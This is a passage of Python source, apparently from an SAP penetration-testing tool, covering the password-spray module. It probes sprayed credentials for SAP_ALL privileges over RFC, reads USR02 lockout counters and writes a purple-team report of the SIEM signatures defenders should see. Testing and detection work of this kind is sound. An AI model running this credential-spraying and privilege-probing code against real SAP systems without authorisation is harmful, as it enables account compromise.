                             (or an alias): the hit fully owns the box.
                             Caller should set ``node.pwned=True`` and
                             emit a CRITICAL finding.
      - ``privileged``    — probe succeeded, user has at least one
                             profile OR role, but nothing matched the
                             SAP_ALL set: working logon with
                             authorizations we haven't verified as
                             propagation-grade.  Caller emits HIGH.
      - ``unprivileged``  — probe succeeded, user has zero profiles
                             AND zero roles: dialog/service user with
                             no authorizations.  Caller emits INFO.
      - ``probe_failed``  — RFC connection failed OR BAPI/UST04 both
                             raised: cannot classify (common on hardened
                             targets that refuse RFC without extra
                             auth).  Caller emits INFO + note.

    Returns ``{"authority_level": str, "profiles": list[str],
              "roles": list[str], "note": str}``.

    Injectable via ``spray_landscape(hit_authority_probe_fn=...)`` so
    tests don't need pyrfc.
    """
    try:
        import sapmap_rfc
    except Exception as e:
        return {
            "authority_level": "probe_failed",
            "profiles": [], "roles": [],
            "note": f"sapmap_rfc not importable: {e}",
        }
    try:
        from sapmap_models import Credentials
    except Exception as e:
        return {
            "authority_level": "probe_failed",
            "profiles": [], "roles": [],
            "note": f"Credentials class not importable: {e}",
        }
    # Build a Credentials object as the SPRAYED user so the RFC
    # handshake uses the exact credential the hit confirmed works.
    try:
        instance_nr = (
            node.instance_nrs()[0]
            if callable(getattr(node, "instance_nrs", None))
            and node.instance_nrs()
            else "00")
    except Exception:
        instance_nr = "00"
    hit_creds = Credentials(
        username=user,
        password=password,
        client=client,
        instance_nr=instance_nr,
        verified=True,
        kind="spray",
    )
    profiles: List[str] = []
    roles: List[str] = []
    try:
        with sapmap_rfc._get_connection(node, hit_creds) as conn:
            try:
                det = conn.call(
                    "BAPI_USER_GET_DETAIL",
                    USERNAME=user,
                    CACHE_RESULTS=" ",
                )
            except Exception as e:
                return {
                    "authority_level": "probe_failed",
                    "profiles": [], "roles": [],
                    "note": f"BAPI_USER_GET_DETAIL raised: {e}",
                }
            for p in (det.get("PROFILES", []) or []):
                prof = ((p.get("BAPIPROF") or p.get("PROFILE") or "")
                        or "").strip()
                if prof:
                    profiles.append(prof)
                if prof in _SAP_ALL_ALIASES:
                    return {
                        "authority_level": "sap_all",
                        "profiles": profiles,
                        "roles": roles,
                        "note": f"PROFILES carries {prof}",
                    }
            for a in (det.get("ACTIVITYGROUPS", []) or []):
                role = ((a.get("AGR_NAME") or a.get("ROLE") or "")
                        or "").strip()
                if role:
                    roles.append(role)
                if role == "SAP_ALL":
                    return {
                        "authority_level": "sap_all",
                        "profiles": profiles,
                        "roles": roles,
                        "note": "ACTIVITYGROUPS carries SAP_ALL",
                    }
    except Exception as e:
        return {
            "authority_level": "probe_failed",
            "profiles": [], "roles": [],
            "note": f"RFC connect/probe raised: {e}",
        }
    if profiles or roles:
        return {
            "authority_level": "privileged",
            "profiles": profiles,
            "roles": roles,
            "note": (f"{len(profiles)} profile(s), "
                     f"{len(roles)} role(s) — no SAP_ALL match"),
        }
    return {
        "authority_level": "unprivileged",
        "profiles": [], "roles": [],
        "note": "BAPI_USER_GET_DETAIL returned no profiles or roles",
    }


def _default_usr02_probe(node, creds, client, users):
    """Default USR02.LOCNT/UFLAG/USTYP reader (issue #69, PR4).

    Returns ``{USER_UPPER: {"locnt": int, "uflag": str, "ustyp": str}}``.
    Empty dict on any failure (UCON block, missing S_TABU_DIS, no
    pyrfc, …) — purple mode degrades to 'baseline unavailable'
    rather than crashing the sweep.

    Injected into ``spray_landscape`` via ``usr02_probe_fn``; tests
    pass a stub so the engine runs without pyrfc / an SDK.

    Both ``client`` and each username are charset-validated BEFORE
    being interpolated into the ABAP WHERE clause — an operator
    wordlist line like ``A','DDIC:pw`` would otherwise widen the
    IN-list and leak USR02 metadata for out-of-scope users (PR4
    adversarial review MED #1 / #8).
    """
    try:
        import sapmap_rfc
    except Exception:
        logger.debug("sapmap_rfc not importable — purple baseline off")
        return {}
    # Reject a malformed client up-front.  SAP mandants are always
    # 3 digits; a non-matching value is operator error (or injection).
    if not _MANDT_RE.match(str(client or "")):
        logger.debug("USR02 probe: refusing malformed client %r", client)
        return {}
    # Charset-whitelist each BNAME.  Keep the dropped-count visible
    # in debug logs for diagnosis without inflating the SprayRun.
    safe_users = []
    dropped = 0
    for u in users:
        uu = (u or "").upper().strip()
        if _BNAME_RE.match(uu):
            safe_users.append(uu)
        else:
            dropped += 1
    if dropped:
        logger.debug(
            "USR02 probe: dropped %d malformed BNAME(s) on %s/%s",
            dropped, getattr(node, "sid", "?"), client)
    out: dict = {}
    for i in range(0, len(safe_users), _USR02_BATCH_SIZE):
        batch = safe_users[i:i + _USR02_BATCH_SIZE]
        # BNAMEs are already upper + charset-validated — safe to
        # single-quote without further escaping.
        bnames = ",".join(f"'{u}'" for u in batch)
        where = (
            f"MANDT = '{client}' AND BNAME IN ({bnames})")
        try:
            rows = sapmap_rfc.read_table(
                node, "USR02",
                fields=["MANDT", "BNAME", "UFLAG", "LOCNT", "USTYP"],
                where=where,
                creds=creds,
                max_rows=len(batch),
                quiet=True,
            )
        except Exception as e:
            logger.debug("USR02 read failed on %s/%s: %s",
                         node.sid, client, e)
            continue
        for row in rows or []:
            u = (row.get("BNAME", "") or "").upper().strip()
            if not u:
                continue
            try:
                locnt = int((row.get("LOCNT", "0") or "0").strip() or 0)
            except (TypeError, ValueError):
                locnt = 0
            out[u] = {
                "locnt": locnt,
                "uflag": (row.get("UFLAG", "") or "").strip(),
                "ustyp": (row.get("USTYP", "") or "").strip(),
            }
    return out


def write_purple_report(run, state, out_dir):
    """Materialise ``purple_report.md`` + ``purple_report.html`` under
    ``loot/spray/<run_id>/`` (issue #69, PR4).

    Blue-team deliverable: enumerates for the SOC exactly what their
    SIEM should have seen (SAL class 00 numbers per attempt, SM21
    hints, USR02.LOCNT deltas, Terminal spoof value).  **NEVER
    writes cleartext passwords** — the signal rows carry only
    ``pw_sha256_prefix`` and the attempts.jsonl audit file is the
    sole source of per-attempt detail.

    Returns the written file paths.  Raises on filesystem errors
    so the operator sees the failure rather than silently losing
    the deliverable.
    """
    os.makedirs(out_dir, exist_ok=True)

    # Collect all signal rows for this run from every node.
    rows: List[dict] = []
    for node in (state.nodes or {}).values():
        for sig in (node.spray_purple_signals or []):
            if sig.get("run_id") == run.run_id:
                rows.append(sig)
    # Chronological order so a SOC can scroll alongside their SIEM.
    rows.sort(key=lambda r: (r.get("ts", ""), r.get("sid", "")))

    sids = sorted({r.get("sid", "") for r in rows if r.get("sid")})
    attempts = len(rows)
    hits = sum(1 for r in rows if r.get("result") in (
        "SUCCESS", "PASSWORD_CHANGE", "NO_AUTH_LOGON"))
    locks = sum(1 for r in rows if r.get("result") == "USER_LOCKED")
    with_delta = sum(
        1 for r in rows
        if r.get("delta_locnt") is not None and r["delta_locnt"] > 0)

    # ---- Markdown ----
    md: List[str] = []
    md.append(f"# Password Spray — Purple-Mode Report")
    md.append("")
    md.append(f"- **Run ID**: `{run.run_id}`")
    md.append(f"- **Started**: {run.started_at}")
    md.append(f"- **Finished**: {run.finished_at or '(in progress)'}")
    md.append(f"- **Scope**: `{run.config_snapshot.get('scope_filter', {})}`")
    md.append(f"- **Terminal spoof**: `{PURPLE_SPRAY_TERMINAL}`")
    md.append(
        f"- **USR02 baseline available**: "
        f"{'yes' if run.purple_baseline_available else 'no'}")
    if run.purple_baseline_error:
        md.append(f"- **Baseline error**: `{run.purple_baseline_error}`")
    md.append("")
    md.append("## Summary")
    md.append("")
    md.append(f"- Attempts: **{attempts}**")
    md.append(f"- Hits (SUCCESS / PASSWORD_CHANGE / NO_AUTH_LOGON): "
              f"**{hits}**")
    md.append(f"- Lockouts observed: **{locks}**")
    md.append(f"- Attempts with observed USR02 delta: **{with_delta}**")
    md.append(f"- Targets reached: **{len(sids)}** "
              f"(`{', '.join(sids)}`)" if sids else "- No targets.")
    md.append("")
    md.append("## Blue-team checklist — did your SIEM see this?")
    md.append("")
    md.append("The following signatures SHOULD have landed in SAL / SM21 "
              "/ ICM.  Use this run ID + the Terminal field to pull the "
              "events out of your SIEM and verify your detection "
              "coverage.")
    md.append("")
    md.append(
        "| Source | Correlation hint |")
    md.append(
        "| --- | --- |")
    md.append(
        "| SAL (RSAU) class 00 | `AU2` (wrong password), `AU6` "
        "(unknown user), `AU7` (no auth), `AUM` (user locked) |")
    md.append(
        f"| SAL Terminal field | `{PURPLE_SPRAY_TERMINAL}` "
        "(when `rsau/ip_only=0`) |")
    md.append(
        "| SM21 | `Wrong password for user <USER>`, "
        "`User <USER> is locked`, `User <USER> does not exist` |")
    md.append(
        "| USR02.LOCNT | delta per (client, user) — replayable "
        "day-after via one `RFC_READ_TABLE` |")
    md.append(
        "| SecurityBridge pre-built rules | `Password Spray Attack`, "
        "`Account Lockout Chain`, `Service Account Reuse` |")
    md.append("")
    md.append("## Per-attempt signal rows")
    md.append("")
    md.append(
        "| TS | SID | Client | User | Result | SAL 00-N | USR02 "
        "baseline | USR02 readback | &Delta; | PW sha256 prefix |")
    md.append(
        "| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |")
    for r in rows:
        delta = r.get("delta_locnt")
        # Every operator-reachable cell runs through _md_escape_cell
        # so a username / sid containing ``|`` or `` ` `` can't
        # break the table or close an inline-code span (PR4
        # adversarial review MED #9).
        md.append(
            f"| {_md_escape_cell(r.get('ts',''))} | "
            f"`{_md_escape_cell(r.get('sid',''))}` | "
            f"`{_md_escape_cell(r.get('client',''))}` | "
            f"`{_md_escape_cell(r.get('user',''))}` | "
            f"**{_md_escape_cell(r.get('result',''))}** | "
            f"`{_md_escape_cell(','.join(r.get('sal_numbers') or []))}` | "
            f"{r.get('baseline_locnt') if r.get('baseline_locnt') is not None else '—'} | "
            f"{r.get('readback_locnt') if r.get('readback_locnt') is not None else '—'} | "
            f"{('+' + str(delta)) if (delta is not None and delta > 0) else (str(delta) if delta is not None else '—')} | "
            f"`{_md_escape_cell(r.get('pw_sha256_prefix',''))}` |")
    md.append("")
    md.append(
        f"_This file is a blue-team deliverable — no cleartext "
        f"passwords.  Join to `attempts.jsonl` by `(ts, "
        f"pw_sha256_prefix)` when SOC needs the full audit trail._")

    md_text = "\n".join(md) + "\n"
    md_path = os.path.join(out_dir, "purple_report.md")

    # ---- HTML (self-contained) ----
    import html as _html
    html_rows: List[str] = []
    for r in rows:
        delta = r.get("delta_locnt")
        delta_cell = (
            f"<span style='color:#f85149'>+{delta}</span>"
            if (delta is not None and delta > 0)
            else (str(delta) if delta is not None else "&mdash;"))
        html_rows.append(
            "<tr>"
            f"<td>{_html.escape(r.get('ts',''))}</td>"
            f"<td><code>{_html.escape(r.get('sid',''))}</code></td>"
            f"<td><code>{_html.escape(r.get('client',''))}</code></td>"
            f"<td><code>{_html.escape(r.get('user',''))}</code></td>"
            f"<td><strong>{_html.escape(r.get('result',''))}</strong></td>"
            f"<td><code>{_html.escape(','.join(r.get('sal_numbers') or []))}</code></td>"
            f"<td>{r.get('baseline_locnt') if r.get('baseline_locnt') is not None else '&mdash;'}</td>"
            f"<td>{r.get('readback_locnt') if r.get('readback_locnt') is not None else '&mdash;'}</td>"
            f"<td>{delta_cell}</td>"
            f"<td><code>{_html.escape(r.get('pw_sha256_prefix',''))}</code></td>"
            "</tr>")

    html_doc = f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>SAPMAP — Password Spray Purple Report ({_html.escape(run.run_id)})</title>
<style>
  body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
          sans-serif; color: #c9d1d9; background: #0d1117;
          padding: 24px; max-width: 1200px; margin: 0 auto; }}
  h1 {{ color: #ffa657; }}
  h2 {{ color: #58a6ff; margin-top: 28px; }}
  .kpis {{ display: flex; gap: 10px; margin: 16px 0; }}
  .kpi {{ background: #161b22; border: 1px solid #30363d;
          border-radius: 6px; padding: 10px 14px; min-width: 140px; }}
  .kpi .v {{ font-size: 22px; font-weight: 700; }}
  .kpi .l {{ font-size: 11px; color: #8b949e; text-transform: uppercase; }}
  table {{ width: 100%; border-collapse: collapse; font-size: 12px; }}
  th, td {{ padding: 4px 8px; border-bottom: 1px solid #21262d;
            text-align: left; }}
  th {{ color: #8b949e; }}
  code {{ background: #010409; padding: 1px 4px; border-radius: 3px; }}
  .meta {{ color: #8b949e; font-size: 12px; }}
  .footer {{ color: #6e7681; font-size: 11px; margin-top: 32px;
             border-top: 1px solid #21262d; padding-top: 12px; }}
</style>
</head>
<body>
<h1>&#128299; Password Spray — Purple-Mode Report</h1>
<p class="meta">
  <strong>Run</strong> <code>{_html.escape(run.run_id)}</code> &middot;
  <strong>Started</strong> {_html.escape(run.started_at)} &middot;
  <strong>Finished</strong> {_html.escape(run.finished_at or '(in progress)')} &middot;
  <strong>Terminal spoof</strong> <code>{_html.escape(PURPLE_SPRAY_TERMINAL)}</code>
</p>
<p class="meta">
  USR02 baseline available: <strong>{'yes' if run.purple_baseline_available else 'no'}</strong>
  {('&mdash; ' + _html.escape(run.purple_baseline_error)) if run.purple_baseline_error else ''}
</p>
<div class="kpis">
  <div class="kpi"><div class="v">{attempts}</div><div class="l">Attempts</div></div>
  <div class="kpi"><div class="v" style="color:#f85149">{hits}</div><div class="l">Hits</div></div>
  <div class="kpi"><div class="v" style="color:#ffa657">{locks}</div><div class="l">Lockouts</div></div>
  <div class="kpi"><div class="v" style="color:#58a6ff">{with_delta}</div><div class="l">USR02 &Delta;&gt;0</div></div>
  <div class="kpi"><div class="v">{len(sids)}</div><div class="l">Targets</div></div>
</div>
<h2>Blue-team checklist — did your SIEM see this?</h2>
<table>
<tr><th>Source</th><th>Correlation hint</th></tr>
<tr><td>SAL (RSAU) class 00</td><td><code>AU2</code> (wrong password), <code>AU6</code> (unknown user), <code>AU7</code> (no auth), <code>AUM</code> (user locked)</td></tr>
<tr><td>SAL Terminal field</td><td><code>{_html.escape(PURPLE_SPRAY_TERMINAL)}</code> (when <code>rsau/ip_only=0</code>)</td></tr>
<tr><td>SM21</td><td><code>Wrong password for user &lt;USER&gt;</code>, <code>User &lt;USER&gt; is locked</code>, <code>User &lt;USER&gt; does not exist</code></td></tr>
<tr><td>USR02.LOCNT</td><td>delta per (client, user) &mdash; replayable day-after via one <code>RFC_READ_TABLE</code></td></tr>
<tr><td>SecurityBridge pre-built rules</td><td><code>Password Spray Attack</code>, <code>Account Lockout Chain</code>, <code>Service Account Reuse</code></td></tr>
</table>
<h2>Per-attempt signal rows</h2>
<table>
<thead>
<tr>
<th>TS</th><th>SID</th><th>Client</th><th>User</th><th>Result</th>
<th>SAL 00-N</th><th>USR02 baseline</th><th>USR02 readback</th>
<th>&Delta;</th><th>PW sha256 prefix</th>
</tr>
</thead>
<tbody>
{''.join(html_rows)}
</tbody>
</table>
<p class="footer">
  Blue-team deliverable &mdash; no cleartext passwords.  Join to
  <code>attempts.jsonl</code> by <code>(ts, pw_sha256_prefix)</code>
  when SOC needs the full audit trail.
</p>
</body>
</html>
"""
    html_path = os.path.join(out_dir, "purple_report.html")
    # Atomic commit (PR4 adversarial review MED #5): write both files
    # to tempfiles under the same directory, then os.replace() each
    # to its final name ONLY after both files are flushed to disk.
    # If any write raises mid-way, the temp files are removed and no
    # partial purple_report.{md,html} is left on disk.
    md_tmp = tempfile.NamedTemporaryFile(
        mode="w", encoding="utf-8",
        dir=out_dir, prefix=".purple_report.md.", suffix=".tmp",
        delete=False)
    html_tmp = tempfile.NamedTemporaryFile(
        mode="w", encoding="utf-8",
        dir=out_dir, prefix=".purple_report.html.", suffix=".tmp",
        delete=False)
    try:
        md_tmp.write(md_text)
        md_tmp.flush()
        md_tmp.close()
        html_tmp.write(html_doc)
        html_tmp.flush()
        html_tmp.close()
        os.replace(md_tmp.name, md_path)
        os.replace(html_tmp.name, html_path)
    except Exception:
        # Clean up any partial tempfiles before re-raising so the
        # caller sees a clean 'no deliverable written' state.
        for _p in (md_tmp.name, html_tmp.name):
            try:
                if os.path.exists(_p):
                    os.remove(_p)
            except Exception:
                pass
        raise

    return {"md": md_path, "html": html_path, "rows": len(rows)}


def _default_loot_dir(run_id: str) -> str:
    """Resolve ``loot/spray/<run_id>/`` using the shared loot helper
    when importable; falls back to a scratch dir under /tmp if the
    helper isn't on the path.  Only called on real (non-dry) runs."""
    try:
        from sapmap_state import ensure_loot_dir
    except Exception:
        base = os.path.join("/tmp", "sapmap_loot_spray", run_id)
        os.makedirs(base, exist_ok=True)
        return base
    base = ensure_loot_dir(f"spray/{run_id}")
    os.makedirs(base, exist_ok=True)
    return base


# ---------------------------------------------------------------------------
# Status singleton (issue #69, PR3)
#
# Mirrors the AutoPwn status pattern (sapmap_autopwn._status):
#  - process-global singleton written by the orchestrator thread
#  - read by Bottle request threads serving GET /status
#  - no lock needed because writers are always SINGLE-WRITER (the one
#    _bg thread spawned by the launch route)
#
# Phase order drives the progress panel.  Keep this in sync with the
# frontend's phaseOrder array; the strings are the canonical phase
# names across backend + frontend + script-runner.
# ---------------------------------------------------------------------------

PHASE_ORDER = [
    "idle",
    "collect_pool",
    "profile_probe",
    "baseline",     # purple-mode: read USR02.LOCNT per (sid, client, user)
    "spray",
    "readback",    # purple-mode: re-read USR02.LOCNT, compute deltas
    "report",
    "done",
]


@dataclass
class PwSprayStatus:
    """Operator-facing snapshot of the currently-running (or last-
    completed) spray.  Serialised directly into the /status payload
    — don't add fields the GUI shouldn't see."""
    running: bool = False
    finished: bool = False
    phase: str = "idle"
    # phase_progress is [done, total] for a progress-bar-friendly
    # within-phase indicator.  Zero total == indeterminate.
    phase_progress: Tuple[int, int] = (0, 0)
    run_id: str = ""
    scope: str = ""              # 'landscape' / 'single:<sid>' / 'preview'
    dry_run: bool = True
    cap_per_user: int = 1
    targets_total: int = 0
    targets_done: int = 0
    attempts_total: int = 0
    attempts_done: int = 0
    hits: int = 0
    locks: int = 0
    skipped_count: int = 0
    aborted: str = ""
    started_at: str = ""
    finished_at: str = ""
    # Per-attempt visibility (added for the slow/silent/no-stop
    # follow-up on #121).  Operator-reported "nothing is happening"
    # between HIT lines was partly the engine's silence between
    # 1-17s attempts.  These fields are populated inside the engine's
    # on_pre_attempt hook just BEFORE each try_login call, so the
    # GUI panel (/api/actions/password_spray/status poll @800ms)
    # can render a 'Now trying: <SID>/<CLIENT> user=<USER> (i/N)'
    # row that updates every attempt.
    current_target_sid: str = ""
    current_target_host: str = ""
    current_client: str = ""
    current_user: str = ""
    current_candidate_index: int = 0
    current_candidate_total: int = 0
    last_result: str = ""
    last_detail: str = ""
    # Short log tail for the progress panel's console pane.  Capped
    # by _append_log so the serialized payload stays small.
    log_tail: List[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        d = asdict(self)
        d["phase_progress"] = list(d["phase_progress"])
        return d


_status: PwSprayStatus = PwSprayStatus()


def get_status() -> dict:
    """Return the current pwspray status as a plain dict suitable for
    ``json.dumps``.  Called by Bottle request threads; the single-
    writer invariant means we don't need a lock."""
    return _status.to_dict()


def _reset_status(**init) -> PwSprayStatus:
    """Start a new run: wipe the singleton and seed with the fields the
    orchestrator knows up-front (scope, dry_run, cap_per_user, run_id)."""
    global _status
    _status = PwSprayStatus(running=True, phase="idle", **init)
    return _status


def _set_phase(phase: str) -> None:
    """Advance the phase marker.  No-op when the phase is unknown so
    tests don't have to monkey-patch PHASE_ORDER to use a subset."""
    if phase not in PHASE_ORDER:
        logger.debug("ignoring unknown phase %r", phase)
        return
    _status.phase = phase
    _status.phase_progress = (0, 0)


def _set_phase_progress(done: int, total: int) -> None:
    _status.phase_progress = (int(done), int(total))


def _bump_targets_done() -> None:
    _status.targets_done += 1


def mark_stop_requested() -> None:
    """Mark the current pwspray run as stop-requested so the GUI poll
    sees 'stopping…' in the next 800ms tick, before the engine's
    cancel_check actually bubbles up.  Called by sapmap_gui's
    stop_scan handler alongside sapmap_stop.request_stop().

    Idempotent — safe to call multiple times.  Preserves an already-
    set aborted reason (e.g. a prior cascade_abort) rather than
    stomping it with the operator's late STOP."""
    if _status.aborted:
        return
    _status.aborted = "stop_requested"


def _append_log(line: str, *, cap: int = 200) -> None:
    """Push a short log line into the status's log tail.  Kept small
    (200 lines) so the serialized payload stays legible; the full
    attempts audit lives on disk in loot/spray/<run_id>/."""
    _status.log_tail.append(line)
    if len(_status.log_tail) > cap:
        del _status.log_tail[0:len(_status.log_tail) - cap]


def _finalise_status(run) -> None:
    """Called once at the end of spray_landscape.  Pulls the final
    tallies off the SprayRun so GET /status reflects the result
    without the caller having to also poll /runs."""
    _status.running = False
    _status.finished = True
    _status.phase = "done"
    _status.run_id = run.run_id
    _status.attempts_total = run.attempts_total
    _status.attempts_done = run.attempts_done
    _status.hits = len(run.hits or [])
    _status.locks = len(run.locked_users or [])
    _status.skipped_count = len(run.skipped or [])
    _status.aborted = run.aborted or ""
    _status.started_at = run.started_at
    _status.finished_at = run.finished_at
